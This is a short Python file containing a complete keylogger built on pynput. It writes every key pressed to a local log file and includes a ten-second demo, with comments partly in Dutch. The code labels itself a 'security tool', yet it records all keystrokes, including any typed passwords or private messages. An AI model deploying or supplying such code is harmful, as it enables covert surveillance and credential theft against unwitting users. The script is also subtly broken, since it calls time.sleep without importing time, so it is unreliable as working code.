# keylogger.py

from pynput import keyboard
from datetime import datetime

class Keylogger:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
        self.log = []
        self.listener = keyboard.Listener(on_press=self.on_press)

    def on_press(self, key):
        try:
            # Register character keys (e.g., letters, numbers)
            self.log.append(key.char)
        except AttributeError:
            # Register special keys (e.g., Enter, Shift)
            self.log.append(f"[{key}]")

        # Write each keystroke directly to the log file
        try:
            with open(self.log_file, "a") as f:
                f.write(self.log[-1])  # Write the last logged key
        except Exception as e:
            self.log_error(f"Error writing to log file: {e}")

    def start(self):
        # Initialize log file with a start message
        try:
            with open(self.log_file, "w") as f:
                f.write("Keylogger started\n")
        except Exception as e:
            self.log_error(f"Error initializing log file: {e}")
        # Start listening for key presses
        self.listener.start()

    def stop(self):
        # Stop the listener when finished
        self.listener.stop()

    @staticmethod
    def log_error(message):
        """Logs errors to a dedicated error file."""
        with open("error_log.txt", "a") as error_file:
            error_file.write(f"{datetime.now()}: {message}\n")

security_tool = Keylogger()
# Voorbeeld van de Keylogger module
print("Starting keylogger (run for 10 seconds)...")
security_tool.start()

print("Keylogger is running... Press keys to test it.")

# Run de keylogger voor 10 seconden voor testdoeleinden
time.sleep(10)

# Stop de keylogger en beëindig het programma
security_tool.stop()
